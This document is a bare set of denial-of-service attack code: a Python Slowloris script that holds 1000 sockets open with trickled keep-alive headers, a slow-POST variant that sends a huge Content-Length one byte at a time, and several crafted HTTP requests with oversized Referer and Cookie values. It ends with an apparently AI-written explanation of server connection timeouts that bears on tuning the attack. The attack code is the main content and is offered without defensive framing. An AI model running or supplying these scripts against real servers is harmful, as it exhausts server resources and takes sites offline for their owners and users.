import socket
import time

host = "www.example.com"
port = 80
socket_list = []

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    s.connect((host, port))
    s.send("GET / HTTP/1.1\r\nHost: " + host + "\r\n")
    return s

for i in range(1000):
    print("Socket %d created" % i)
    try:
        s = create_socket()
    except socket.error:
        break
    socket_list.append(s)

while True:
    print("Sending keep-alive headers...")
    for s in socket_list:
        s.send("X-a: b\r\n")
    time.sleep(15)

=============================


import socket
import time

# Target host and port
host = "www.example.com"
port = 80

# Create a list to store the sockets
socket_list = []

def create_socket():
    # Create a new socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the target host and port
    s.connect((host, port))

    # Send partial POST request with large payload
    s.send("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 1000000\r\n")

    return s

# Create a large number of sockets
for _ in range(1000):
    try:
        s = create_socket()
        socket_list.append(s)
    except:
        break

# Send partial POST requests through each socket
while True:
    for s in socket_list:
        try:
            s.send("X")
        except:
            socket_list.remove(s)
    time.sleep(1)

==================================================================================================

GET / HTTP/1.1
Host: www.example.com
Range: bytes=0-10\r\n


POST / HTTP/1.1
Host: www.example.com
Referer: http://www.example.com/x"*10000
Content-Length: 5\r\n
X\r\n


POST / HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4577.104 Safari/537.36\r\n


POST / HTTP/1.1
Host: www.example.com
Cookie: name=value"*10000
Content-Length: 5\r\n
X\r\n


Keep-Alive: timeout=5, max=100\r\n
Connection: Keep-Alive\r\n
























The time it takes for a server to drop a connection if it doesn't receive a complete header depends on various factors, such as the configuration of the server and the network, the type of web server, and the load on the server.

There is no standard time for when a server will drop a connection, as it is up to the configuration of the server and the policies of the system administrator. Some servers may have a timeout set for a few seconds, while others may wait for several minutes. The timeout is set to ensure that resources are not consumed indefinitely by connections that are not going to complete.

As for statistics, it's difficult to provide exact numbers, as different web servers have different configurations, and the behavior can also be influenced by network conditions and the load on the server. However, in general, most web servers are designed to drop a connection if it is inactive for a certain period of time, typically ranging from a few seconds to a few minutes. The exact timeout value is usually configurable, so it depends on the server setup.



















